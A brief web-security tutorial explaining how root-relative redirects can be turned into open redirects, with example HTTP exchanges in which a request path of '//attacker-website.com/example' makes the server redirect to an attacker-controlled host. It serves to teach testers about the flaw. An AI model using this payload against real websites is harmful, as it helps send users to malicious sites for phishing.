
# Turning root-relative redirects into open redirects

In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the Location header:

```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path:

```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```